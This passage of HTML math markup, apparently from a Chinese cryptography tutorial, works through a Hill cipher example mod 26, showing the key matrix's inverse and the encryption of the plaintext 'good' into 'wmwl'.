aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.40003em;vertical-align:-0.95003em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">(</span></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">8</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">3</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">7</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">)</span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord">1</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:2.40003em;vertical-align:-0.95003em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">(</span></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">7</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">−</span><span class="mord">8</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord">3</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">)</span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.40003em;vertical-align:-0.95003em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">(</span></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord">8</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span><span class="mord">3</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">7</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">)</span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord">6</span></span></span></span></p><p>将明文划分为两组：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>g</mi><mo separator="true">,</mo><mi>o</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mo stretchy="false">(</mo><mi>o</mi><mo separator="true">,</mo><mi>d</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(g,o),(o,d)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">o</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mopen">(</span><span class="mord mathnormal">o</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">d</span><span class="mclose">)</span></span></span></span>，即<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mn>6</mn><mo separator="true">,</mo><mn>14</mn><mo stretchy="false">)</mo><mo separator="true">,</mo><mo stretchy="false">(</mo><mn>14</mn><mo separator="true">,</mo><mn>3</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(6,14),(14,3)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">6</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord">4</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mord">4</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">3</span><span class="mclose">)</span></span></span></span>，加密过程如下：</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mtable rowspacing="0.15999999999999992em" columnalign="left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mrow><mo fence="true">(</mo><mfrac linethickness="0px"><msub><mi>c</mi><mn>1</mn></msub><msub><mi>c</mi><mn>2</mn></msub></mfrac><mo fence="true">)</mo></mrow><mo>=</mo><mi>k</mi><mrow><mo fence="true">(</mo><mfrac linethickness="0px"><msub><mi>p</mi><mn>1</mn></msub><msub><mi>p</mi><mn>2</mn></msub></mfrac><mo fence="true">)</mo></mrow><mo>=</mo><mrow><mo fence="true">(</mo><mtable rowspacing="0.15999999999999992em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>11</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>8</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>3</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>7</mn></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow><mrow><mo fence="true">(</mo><mfrac linethickness="0px"><mn>6</mn><mn>14</mn></mfrac><mo fence="true">)</mo></mrow><mo>=</mo><mrow><mo fence="true">(</mo><mfrac linethickness="0px"><mn>178</mn><mn>116</mn></mfrac><mo fence="true">)</mo></mrow><mo>=</mo><mrow><mo fence="true">(</mo><mfrac linethickness="0px"><mn>22</mn><mn>12</mn></mfrac><mo fence="true">)</mo></mrow><mo stretchy="false">(</mo><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mn>26</mn><mo stretchy="false">)</mo><mo>⇒</mo><mrow><mo fence="true">(</mo><mfrac linethickness="0px"><mi>w</mi><mi>m</mi></mfrac><mo fence="true">)</mo></mrow></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mrow><mo fence="true">(</mo><mfrac linethickness="0px"><msub><mi>c</mi><mn>3</mn></msub><msub><mi>c</mi><mn>4</mn></msub></mfrac><mo fence="true">)</mo></mrow><mo>=</mo><mi>k</mi><mrow><mo fence="true">(</mo><mfrac linethickness="0px"><msub><mi>p</mi><mn>3</mn></msub><msub><mi>p</mi><mn>4</mn></msub></mfrac><mo fence="true">)</mo></mrow><mo>=</mo><mrow><mo fence="true">(</mo><mtable rowspacing="0.15999999999999992em" columnalign="center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>11</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>8</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>3</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>7</mn></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow><mrow><mo fence="true">(</mo><mfrac linethickness="0px"><mn>14</mn><mn>3</mn></mfrac><mo fence="true">)</mo></mrow><mo>=</mo><mrow><mo fence="true">(</mo><mfrac linethickness="0px"><mn>178</mn><mn>63</mn></mfrac><mo fence="true">)</mo></mrow><mo>=</mo><mrow><mo fence="true">(</mo><mfrac linethickness="0px"><mn>22</mn><mn>11</mn></mfrac><mo fence="true">)</mo></mrow><mo stretchy="false">(</mo><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mn>26</mn><mo stretchy="false">)</mo><mo>⇒</mo><mrow><mo fence="true">(</mo><mfrac linethickness="0px"><mi>w</mi><mi>l</mi></mfrac><mo fence="true">)</mo></mrow></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{array}{l}\binom{c_{1}}{c_{2}}=k\binom{p_{1}}{p_{2}}=\left(\begin{array}{ll}11 &amp; 8 \\3 &amp; 7\end{array}\right)\binom{6}{14}=\binom{178}{116}=\binom{22}{12}(\bmod 26) \Rightarrow\binom{w}{m} \\\binom{c_{3}}{c_{4}}=k\binom{p_{3}}{p_{4}}=\left(\begin{array}{cc}11 &amp; 8 \\3 &amp; 7\end{array}\right)\binom{14}{3}=\binom{178}{63}=\binom{22}{11}(\bmod 26) \Rightarrow\binom{w}{l}\end{array}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:4.80006em;vertical-align:-2.15003em;"></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.65003em;"><span style="top:-4.65003em;"><span class="pstrut" style="height:3.45em;"></span><span class="mord"><span class="mord"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">(</span></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.745392em;"><span style="top:-2.355em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.144em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.44509999999999994em;"><span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">)</span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">(</span></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.745392em;"><span style="top:-2.3550000000000004em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.144em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.481108em;"><span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">)</span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">(</span></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span><span class="mord">1</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">8</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">7</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">)</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">(</span></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8951079999999999em;"><span style="top:-2.3550000000000004em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">4</span></span></span></span><span style="top:-3.144em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">)</span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">(</span></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8951079999999999em;"><span style="top:-2.3550000000000004em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">1</span><span class="mord mtight">6</span></span></span></span><span style="top:-3.144em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">7</span><span class="mord mtight">8</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">)</span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">(</span></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8951079999999999em;"><span style="top:-2.3550000000000004em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">2</span></span></span></span><span style="top:-3.144em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">)</span></span></span><span class="mopen">(</span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mord">2</span><span class="mord">6</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">⇒</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">(</span></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7453919999999999em;"><span style="top:-2.3550000000000004em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span style="top:-3.144em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.02691em;">w</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">)</span></span></span></span></span><span style="top:-2.25em;"><span class="pstrut" style="height:3.45em;"></span><span class="mord"><span class="mord"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">(</span></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.745392em;"><span style="top:-2.355em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">4</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.144em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.44509999999999994em;"><span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">)</span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">(</span></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.745392em;"><span style="top:-2.3550000000000004em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">4</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.144em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.481108em;"><span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">)</span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">(</span></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span><span class="mord">1</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">8</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">7</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">)</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">(</span></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8951079999999999em;"><span style="top:-2.3550000000000004em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span><span style="top:-3.144em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">4</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">)</span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">(</span></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8951079999999999em;"><span style="top:-2.3550000000000004em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">6</span><span class="mord mtight">3</span></span></span></span><span style="top:-3.144em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">7</span><span class="mord mtight">8</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">)</span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">(</span></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8951079999999999em;"><span style="top:-2.3550000000000004em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.144em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">)</span></span></span><span class="mopen">(</span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.05555555555555555em;"></span><span class="mord">2</span><span class="mord">6</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">⇒</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">(</span></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7453919999999999em;"><span style="top:-2.3550000000000004em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span></span></span></span><span style="top:-3.144em;"><span class="pstrut" 